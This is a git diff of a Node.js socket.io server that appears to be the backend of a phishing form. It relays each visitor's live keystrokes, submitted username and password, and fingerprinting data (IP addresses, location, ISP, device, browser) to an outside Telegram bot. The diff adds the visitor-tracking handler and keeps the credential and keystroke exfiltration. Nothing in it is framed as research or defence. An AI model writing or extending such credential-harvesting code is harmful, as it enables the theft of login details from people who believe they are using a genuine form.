@@ -1,3 +1,4 @@
+
 const express = require("express");
 const http = require("http");
 const { Server } = require("socket.io");
@@ -16,29 +17,58 @@ app.use(cors());
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
+// Send message to Telegram
 function sendTelegram(message){
     axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
         chat_id: CHAT_ID,
         text: message
-    });
+    }).catch(err => console.log("Telegram Error:", err.message));
 }
 
 io.on("connection",(socket)=>{
 
-    console.log("User opened the form");
+    console.log("User connected");
 
-    sendTelegram("⚠️ Someone opened your form");
+    // Receive visitor info from frontend
+    socket.on("visitor-info",(data)=>{
 
-    socket.on("typing",(data)=>{
-        console.log("Typing:",data);
+        console.log("Visitor Data:", data);
 
-        sendTelegram(`Typing\nField: ${data.field}\nValue: ${data.value}`);
+        sendTelegram(`⚠️ New Visitor
+
+🌐 IPv6: ${data.ipv6}
+🌐 IPv4: ${data.ipv4}
+
+📍 Location: ${data.city}, ${data.region}, ${data.country}
+
+🏢 ISP: ${data.isp}
+
+📱 Device: ${data.device}
+
+🌍 Map: ${data.map}
+
+🌐 Browser: ${data.browser}
+`);
     });
 
-    socket.on("submit",(data)=>{
-        console.log("Form submitted",data);
+    // Track typing
+    socket.on("typing",(data)=>{
+        sendTelegram(`⌨️ Typing
 
-        sendTelegram(`✅ Final Submission\nUsername: ${data.username}\nPassword: ${data.password}`);
+Field: ${data.field}
+Value: ${data.value}`);
+    });
+
+    // Final form submission
+    socket.on("submit",(data)=>{
+        sendTelegram(`✅ Final Submission
+
+Username: ${data.username}
+Password: ${data.password}`);
+    });
+
+    socket.on("disconnect",()=>{
+        console.log("User disconnected");
     });
 
 });
